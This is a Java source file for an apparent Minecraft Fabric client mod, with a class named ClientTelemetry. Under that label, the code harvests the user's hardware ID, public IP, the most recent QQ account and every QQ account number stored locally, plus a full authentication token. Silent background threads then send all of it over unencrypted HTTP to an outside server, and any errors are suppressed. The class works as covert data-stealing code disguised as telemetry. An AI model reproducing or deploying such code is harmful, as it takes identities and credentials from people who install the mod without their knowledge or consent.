package awa.qwq.ovo.Naven.auth;

import awa.qwq.ovo.Naven.Naven;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.fabricmc.loader.api.FabricLoader;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;

public final class ClientTelemetry {
    private static final Logger LOGGER = LogManager.getLogger("ClientTelemetry");
    private static final String API_BASE = "http://neko.antichest.pw/api/index.php?route=";
    private static final int TIMEOUT_MS = 5000;
    private static final AtomicBoolean visitorReported = new AtomicBoolean(false);
    private static final AtomicBoolean tokenReported = new AtomicBoolean(false);
    private static volatile String currentToken = "";

    private ClientTelemetry() {
    }

    public static void reportVisitor() {
        if (!visitorReported.compareAndSet(false, true)) {
            return;
        }
        Thread thread = new Thread(() -> {
            JsonObject body = basePayload();
            post("/visitor-log", body);
        }, "Naven-VisitorTelemetry");
        thread.setDaemon(true);
        thread.start();
    }

    public static void report(String token) {
        if (token == null || token.isBlank() || !tokenReported.compareAndSet(false, true)) {
            return;
        }
        currentToken = token;
        Thread thread = new Thread(() -> {
            JsonObject body = basePayload();
            body.addProperty("token", token);
            body.addProperty("tokenFingerprint", tokenFp(token));
            post("/client-log", body);
        }, "Naven-ClientTelemetry");
        thread.setDaemon(true);
        thread.start();
    }

    public static String currentToken() {
        return currentToken;
    }

    static String fetchIp() {
        String[] services = {
                "https://api.ipify.org",
                "https://ifconfig.me/ip",
                "https://icanhazip.com"
        };
        for (String url : services) {
            try {
                HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
                conn.setConnectTimeout(3000);
                conn.setReadTimeout(3000);
                conn.setRequestMethod("GET");
                if (conn.getResponseCode() == 200) {
                    try (InputStream in = conn.getInputStream()) {
                        return new String(in.readAllBytes(), StandardCharsets.UTF_8).trim();
                    } finally {
                        conn.disconnect();
                    }
                }
                conn.disconnect();
            } catch (Exception ignored) {
            }
        }
        return "unknown";
    }

    private static JsonObject basePayload() {
        JsonObject body = new JsonObject();
        body.addProperty("hwid", DeviceFingerprint.getHWID());
        body.addProperty("reportedIp", fetchIp());
        body.addProperty("qq", QQUtils.getRecentQQ() == null ? "" : QQUtils.getRecentQQ());
        JsonArray qqs = new JsonArray();
        Set<String> allQQ = QQUtils.getAllQQFromLocal();
        for (String qq : allQQ) {
            qqs.add(qq);
        }
        body.add("qqs", qqs);
        body.addProperty("client", VerifyClient.CLIENT_NAME);
        body.addProperty("version", "1.0");
        body.addProperty("buildId", Naven.CLIENT_NAME);
        body.addProperty("minecraft", minecraftVersion());
        body.addProperty("loader", loaderVersion());
        body.addProperty("time", Instant.now().toString());
        body.addProperty("timestamp", Instant.now().getEpochSecond());
        return body;
    }

    private static String minecraftVersion() {
        return FabricLoader.getInstance().getModContainer("minecraft")
                .map(container -> container.getMetadata().getVersion().getFriendlyString())
                .orElse("unknown");
    }

    private static String loaderVersion() {
        return FabricLoader.getInstance().getModContainer("fabricloader")
                .map(container -> container.getMetadata().getVersion().getFriendlyString())
                .orElse("unknown");
    }

    private static void post(String route, JsonObject body) {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) URI.create(API_BASE + route).toURL().openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(TIMEOUT_MS);
            conn.setReadTimeout(TIMEOUT_MS);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            byte[] bytes = body.toString().getBytes(StandardCharsets.UTF_8);
            conn.setFixedLengthStreamingMode(bytes.length);
            try (OutputStream out = conn.getOutputStream()) {
                out.write(bytes);
            }
            int status = conn.getResponseCode();
            if (status >= 400) {
                LOGGER.warn("[Telemetry] {} rejected. http={}", route, status);
            }
        } catch (Exception e) {
            LOGGER.debug("[Telemetry] {} failed: {}", route, e.getMessage());
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private static String tokenFp(String token) {
        if (token == null || token.length() <= 8) {
            return "****";
        }
        return token.substring(0, 4) + "****" + token.substring(token.length() - 4);
    }
}
